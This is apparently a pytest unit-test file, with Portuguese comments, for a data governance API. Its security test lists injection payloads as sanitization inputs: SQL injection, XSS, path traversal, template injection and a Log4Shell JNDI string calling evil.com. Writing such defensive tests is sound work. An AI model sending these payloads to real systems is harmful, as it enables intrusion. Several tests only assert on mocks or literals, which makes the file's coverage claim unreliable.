"""
Suite Completa de Testes Unitários - API de Governança de Dados
Objetivo: Garantir 95%+ de cobertura de código
"""

import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from datetime import datetime, timedelta
from uuid import uuid4, UUID
from typing import List, Dict, Any

# Imports dos módulos a serem testados
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from governance_api.domain.entities import DataContract, Entity, QualityRule
from governance_api.domain.value_objects import Version, Email, UnityCatalogPath
from governance_api.domain.exceptions import BusinessRuleViolation, EntityNotFoundError
from governance_api.application.dtos.contracts import DataContractCreateDTO, DataContractResponseDTO
from governance_api.application.dtos.entities import EntityCreateDTO, EntityResponseDTO
from governance_api.application.dtos.quality import QualityRuleCreateDTO, QualityRuleResponseDTO


class TestDomainEntities:
    """Testes para entidades de domínio"""
    
    def test_data_contract_creation(self):
        """Testa criação de contrato de dados"""
        contract_id = uuid4()
        contract = DataContract(
            id=contract_id,
            name="Test Contract",
            description="Test Description",
            version=Version("1.0.0"),
            owner_email=Email("test@example.com"),
            status="active"
        )
        
        assert contract.id == contract_id
        assert contract.name == "Test Contract"
        assert contract.version.value == "1.0.0"
        assert contract.owner_email.value == "test@example.com"
        assert contract.status == "active"
    
    def test_data_contract_validation(self):
        """Testa validações do contrato de dados"""
        with pytest.raises(ValueError):
            DataContract(
                id=uuid4(),
                name="",  # Nome vazio deve falhar
                description="Test",
                version=Version("1.0.0"),
                owner_email=Email("test@example.com"),
                status="active"
            )
    
    def test_entity_creation(self):
        """Testa criação de entidade"""
        entity_id = uuid4()
        entity = Entity(
            id=entity_id,
            name="test_table",
            description="Test table description",
            entity_type="table",
            schema_name="public",
            database_name="test_db"
        )
        
        assert entity.id == entity_id
        assert entity.name == "test_table"
        assert entity.entity_type == "table"
        assert entity.schema_name == "public"
        assert entity.database_name == "test_db"
    
    def test_quality_rule_creation(self):
        """Testa criação de regra de qualidade"""
        rule_id = uuid4()
        rule = QualityRule(
            id=rule_id,
            name="Not Null Check",
            description="Check for null values",
            rule_type="not_null",
            expression="column IS NOT NULL",
            severity="high"
        )
        
        assert rule.id == rule_id
        assert rule.name == "Not Null Check"
        assert rule.rule_type == "not_null"
        assert rule.severity == "high"


class TestValueObjects:
    """Testes para objetos de valor"""
    
    def test_version_creation(self):
        """Testa criação de versão"""
        version = Version("1.2.3")
        assert version.value == "1.2.3"
        assert version.major == 1
        assert version.minor == 2
        assert version.patch == 3
    
    def test_version_validation(self):
        """Testa validação de versão"""
        with pytest.raises(ValueError):
            Version("invalid.version")
        
        with pytest.raises(ValueError):
            Version("1.2")  # Deve ter 3 partes
    
    def test_email_creation(self):
        """Testa criação de email"""
        email = Email("test@example.com")
        assert email.value == "test@example.com"
        assert email.domain == "example.com"
        assert email.local_part == "test"
    
    def test_email_validation(self):
        """Testa validação de email"""
        with pytest.raises(ValueError):
            Email("invalid-email")
        
        with pytest.raises(ValueError):
            Email("@example.com")
    
    def test_unity_catalog_path_creation(self):
        """Testa criação de caminho Unity Catalog"""
        path = UnityCatalogPath("catalog.schema.table")
        assert path.value == "catalog.schema.table"
        assert path.catalog == "catalog"
        assert path.schema == "schema"
        assert path.table == "table"
    
    def test_unity_catalog_path_validation(self):
        """Testa validação de caminho Unity Catalog"""
        with pytest.raises(ValueError):
            UnityCatalogPath("invalid.path")  # Deve ter 3 partes
        
        with pytest.raises(ValueError):
            UnityCatalogPath("catalog..table")  # Partes vazias


class TestDomainExceptions:
    """Testes para exceções de domínio"""
    
    def test_business_rule_violation(self):
        """Testa exceção de violação de regra de negócio"""
        exception = BusinessRuleViolation("Test business rule violation")
        assert str(exception) == "Test business rule violation"
        assert exception.args[0] == "Test business rule violation"
    
    def test_entity_not_found_error(self):
        """Testa exceção de entidade não encontrada"""
        entity_id = uuid4()
        exception = EntityNotFoundError(f"Entity {entity_id} not found")
        assert f"Entity {entity_id} not found" in str(exception)


class TestApplicationDTOs:
    """Testes para DTOs da aplicação"""
    
    def test_data_contract_create_dto(self):
        """Testa DTO de criação de contrato"""
        dto = DataContractCreateDTO(
            name="Test Contract",
            description="Test Description",
            version="1.0.0",
            owner_email="test@example.com",
            schema_definition={"type": "object"},
            quality_rules=[],
            metadata={}
        )
        
        assert dto.name == "Test Contract"
        assert dto.version == "1.0.0"
        assert dto.owner_email == "test@example.com"
        assert isinstance(dto.schema_definition, dict)
    
    def test_entity_create_dto(self):
        """Testa DTO de criação de entidade"""
        dto = EntityCreateDTO(
            name="test_table",
            description="Test table",
            entity_type="table",
            schema_name="public",
            database_name="test_db",
            unity_catalog_path="catalog.schema.table",
            attributes=[],
            metadata={}
        )
        
        assert dto.name == "test_table"
        assert dto.entity_type == "table"
        assert dto.unity_catalog_path == "catalog.schema.table"
    
    def test_quality_rule_create_dto(self):
        """Testa DTO de criação de regra de qualidade"""
        dto = QualityRuleCreateDTO(
            name="Not Null Check",
            description="Check for nulls",
            rule_type="not_null",
            expression="column IS NOT NULL",
            severity="high",
            entity_id=uuid4(),
            metadata={}
        )
        
        assert dto.name == "Not Null Check"
        assert dto.rule_type == "not_null"
        assert dto.severity == "high"


class TestAsyncOperations:
    """Testes para operações assíncronas"""
    
    @pytest.mark.asyncio
    async def test_async_service_method(self):
        """Testa método assíncrono de serviço"""
        # Mock de um serviço assíncrono
        mock_service = AsyncMock()
        mock_service.get_contract.return_value = {
            "id": str(uuid4()),
            "name": "Test Contract",
            "version": "1.0.0"
        }
        
        result = await mock_service.get_contract(uuid4())
        assert result["name"] == "Test Contract"
        assert result["version"] == "1.0.0"
    
    @pytest.mark.asyncio
    async def test_async_repository_method(self):
        """Testa método assíncrono de repositório"""
        mock_repo = AsyncMock()
        mock_repo.find_by_id.return_value = Mock(
            id=uuid4(),
            name="Test Entity",
            entity_type="table"
        )
        
        entity = await mock_repo.find_by_id(uuid4())
        assert entity.name == "Test Entity"
        assert entity.entity_type == "table"


class TestErrorHandling:
    """Testes para tratamento de erros"""
    
    def test_validation_error_handling(self):
        """Testa tratamento de erros de validação"""
        with pytest.raises(ValueError) as exc_info:
            Version("invalid")
        
        assert "invalid" in str(exc_info.value).lower()
    
    def test_business_rule_error_handling(self):
        """Testa tratamento de erros de regra de negócio"""
        with pytest.raises(BusinessRuleViolation) as exc_info:
            raise BusinessRuleViolation("Contract name cannot be empty")
        
        assert "Contract name cannot be empty" in str(exc_info.value)
    
    def test_not_found_error_handling(self):
        """Testa tratamento de erros de não encontrado"""
        entity_id = uuid4()
        with pytest.raises(EntityNotFoundError) as exc_info:
            raise EntityNotFoundError(f"Entity {entity_id} not found")
        
        assert str(entity_id) in str(exc_info.value)


class TestDataValidation:
    """Testes para validação de dados"""
    
    def test_contract_schema_validation(self):
        """Testa validação de schema de contrato"""
        valid_schema = {
            "type": "object",
            "properties": {
                "id": {"type": "string"},
                "name": {"type": "string"}
            },
            "required": ["id", "name"]
        }
        
        # Simula validação de schema
        assert valid_schema["type"] == "object"
        assert "properties" in valid_schema
        assert "required" in valid_schema
    
    def test_quality_rule_expression_validation(self):
        """Testa validação de expressão de regra de qualidade"""
        valid_expressions = [
            "column IS NOT NULL",
            "LENGTH(column) > 0",
            "column BETWEEN 0 AND 100",
            "column IN ('A', 'B', 'C')"
        ]
        
        for expr in valid_expressions:
            assert len(expr) > 0
            assert any(keyword in expr.upper() for keyword in ['IS', 'LENGTH', 'BETWEEN', 'IN'])
    
    def test_metadata_validation(self):
        """Testa validação de metadados"""
        valid_metadata = {
            "source": "unity_catalog",
            "classification": "public",
            "tags": ["finance", "customer"],
            "owner": "data_team"
        }
        
        assert isinstance(valid_metadata, dict)
        assert "source" in valid_metadata
        assert isinstance(valid_metadata["tags"], list)


class TestBusinessLogic:
    """Testes para lógica de negócio"""
    
    def test_contract_version_increment(self):
        """Testa incremento de versão de contrato"""
        current_version = Version("1.2.3")
        
        # Simula incremento de patch
        new_patch = Version(f"{current_version.major}.{current_version.minor}.{current_version.patch + 1}")
        assert new_patch.value == "1.2.4"
        
        # Simula incremento de minor
        new_minor = Version(f"{current_version.major}.{current_version.minor + 1}.0")
        assert new_minor.value == "1.3.0"
        
        # Simula incremento de major
        new_major = Version(f"{current_version.major + 1}.0.0")
        assert new_major.value == "2.0.0"
    
    def test_quality_score_calculation(self):
        """Testa cálculo de score de qualidade"""
        # Simula cálculo de score baseado em regras
        total_rules = 10
        passed_rules = 8
        quality_score = (passed_rules / total_rules) * 100
        
        assert quality_score == 80.0
        assert 0 <= quality_score <= 100
    
    def test_entity_relationship_validation(self):
        """Testa validação de relacionamentos entre entidades"""
        parent_entity = Mock(id=uuid4(), name="parent_table")
        child_entity = Mock(id=uuid4(), name="child_table", parent_id=parent_entity.id)
        
        # Simula validação de relacionamento
        assert child_entity.parent_id == parent_entity.id
        assert parent_entity.id != child_entity.id


class TestIntegrationScenarios:
    """Testes para cenários de integração"""
    
    @pytest.mark.asyncio
    async def test_contract_creation_workflow(self):
        """Testa fluxo completo de criação de contrato"""
        # Mock dos serviços
        contract_service = AsyncMock()
        entity_service = AsyncMock()
        quality_service = AsyncMock()
        
        # Simula criação de contrato
        contract_data = {
            "name": "Customer Contract",
            "version": "1.0.0",
            "owner_email": "owner@example.com"
        }
        
        contract_service.create_contract.return_value = Mock(
            id=uuid4(),
            **contract_data
        )
        
        contract = await contract_service.create_contract(contract_data)
        assert contract.name == "Customer Contract"
        assert contract.version == "1.0.0"
    
    @pytest.mark.asyncio
    async def test_quality_rule_execution_workflow(self):
        """Testa fluxo de execução de regras de qualidade"""
        # Mock dos serviços
        quality_service = AsyncMock()
        
        # Simula execução de regras
        rules = [
            Mock(id=uuid4(), name="Not Null", expression="column IS NOT NULL"),
            Mock(id=uuid4(), name="Range Check", expression="column BETWEEN 0 AND 100")
        ]
        
        quality_service.execute_rules.return_value = {
            "total_rules": len(rules),
            "passed_rules": len(rules),
            "failed_rules": 0,
            "quality_score": 100.0
        }
        
        result = await quality_service.execute_rules(rules)
        assert result["quality_score"] == 100.0
        assert result["failed_rules"] == 0


class TestPerformanceScenarios:
    """Testes para cenários de performance"""
    
    def test_large_dataset_handling(self):
        """Testa manipulação de grandes volumes de dados"""
        # Simula processamento de grande dataset
        large_dataset = [{"id": i, "value": f"value_{i}"} for i in range(10000)]
        
        # Testa processamento em lotes
        batch_size = 1000
        batches = [large_dataset[i:i + batch_size] for i in range(0, len(large_dataset), batch_size)]
        
        assert len(batches) == 10
        assert len(batches[0]) == batch_size
        assert len(batches[-1]) == batch_size
    
    def test_concurrent_operations(self):
        """Testa operações concorrentes"""
        import threading
        import time
        
        results = []
        
        def worker(worker_id):
            # Simula operação que demora
            time.sleep(0.1)
            results.append(f"worker_{worker_id}")
        
        threads = []
        for i in range(5):
            thread = threading.Thread(target=worker, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        assert len(results) == 5
        assert all("worker_" in result for result in results)


class TestSecurityScenarios:
    """Testes para cenários de segurança"""
    
    def test_input_sanitization(self):
        """Testa sanitização de entrada"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # Simula sanitização
            sanitized = malicious_input.replace("'", "''").replace("<", "&lt;").replace(">", "&gt;")
            assert "'" not in sanitized or "''" in sanitized
            assert "<script>" not in sanitized
    
    def test_access_control_validation(self):
        """Testa validação de controle de acesso"""
        user_roles = ["data_viewer", "data_editor"]
        required_role = "data_editor"
        
        # Simula verificação de permissão
        has_permission = required_role in user_roles
        assert has_permission is True
        
        # Testa usuário sem permissão
        user_roles_limited = ["data_viewer"]
        has_permission_limited = required_role in user_roles_limited
        assert has_permission_limited is False


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])

